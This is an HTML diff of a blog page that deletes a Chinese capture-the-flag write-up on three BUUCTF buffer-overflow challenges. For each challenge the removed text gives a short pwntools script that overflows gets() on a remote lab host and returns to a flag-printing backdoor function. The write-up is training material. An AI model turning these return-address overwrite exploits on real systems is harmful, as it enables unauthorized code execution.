@@ -80,7 +80,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">325</span>
+            <span class="post-count">0</span>
         </span>
     </span>
 
@@ -96,83 +96,13 @@
  
     </div>
       
-    <div class="tocbot"></div>
-
 
 
 
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="RIP"><a href="#RIP" class="headerlink" title="RIP"></a>RIP</h1><ul>
-<li>文件检查：</li>
-</ul>
-<p>64位文件，没有开启保护</p>
-<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308041150163.png" alt="img"></p>
-<ul>
-<li>代码分析：</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/8d3eb6bb3eb448188197ed54bab7b5fa.png" alt="在这里插入图片描述"></p>
-<p>存在gets函数，存在溢出条件，找到后门函数地址即可</p>
-<p><img src="https://img-blog.csdnimg.cn/3aedf192084d43f4b9ce8cb811bfa643.png#pic_center" alt="在这里插入图片描述"></p>
-<ul>
-<li>exp如下：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;,27715)</span><br><span class="line"></span><br><span class="line">b = 15+8</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*b + p64(0x401187)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>得到flag</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/ace52bd8f3914502ab8f8c634b499d9c.png" alt="在这里插入图片描述"></p>
-<h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><ul>
-<li>先把文件放入虚拟机</li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/7e398aa9bf954e60b1e6536b8e25b6f3.png#pic_center" alt="在这里插入图片描述"></p>
-<p>没有开启保护并且为64位文件</p>
-<ul>
-<li>放入ida中</li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/cb38cbfdfc1049e29ee1867edaa0fa59.png#pic_center" alt="在这里插入图片描述"></p>
-<p>代码分析：两个write函数输出，利用sprintf函数将sub_40060函数的地址打印出来放到s，在最后一行发现gets函数，存在溢出条件。查看是否有后门函数，</p>
-<p><img src="https://img-blog.csdnimg.cn/9a1153114e0c4a07ab557651c69eee27.png#pic_center" alt="在这里插入图片描述"></p>
-<p>发现了cat flag，只要返回到0x40060D，即可得到flag。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/e36506c8eceb4006b005bb5e7173293c.png" alt="在这里插入图片描述"></p>
-<p>偏移量ida已经给出一部分，略加计算可偏移量为0x40+8</p>
-<p>exp如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;,27766)</span><br><span class="line"></span><br><span class="line">b = 0x40+8</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*b + p64(0x40060D)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure>
-
-
-
-<p>得到flag<br><img src="https://img-blog.csdnimg.cn/28239d389706494586e3ce3ffa0b556b.png#pic_center" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><ul>
-<li>文件检查：<br><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/584ccaa9201e47fe83d5894954e27e85.png" alt="在这里插入图片描述"></li>
-</ul>
-<p>发现是64位文件，且只开启了NX保护</p>
-<ul>
-<li>代码分析：</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/d0b1abf00a114a00ad894f16870b637a.png" alt="在这里插入图片描述"></p>
-<p>主函数中调用了func函数，进取看看</p>
-<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/c5bef35b4e9b42aba7bc5133596cee22.png" alt="在这里插入图片描述"></p>
-<p>第九行发现gets函数，且有system函数，找到cat flag的地址就可以直接栈溢出到返回地址。</p>
-<ul>
-<li>exp如下：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;,29229)</span><br><span class="line"></span><br><span class="line">c = 0x30+8</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * c + p64(0x4006BE)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<ul>
-<li>得到FLAG</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/87ea2d2267df42b493e59fcf6a6ab6cf.png" alt="在这里插入图片描述"></p>
-<hr>
- 
+   
       <!-- reward -->
       
     </div>
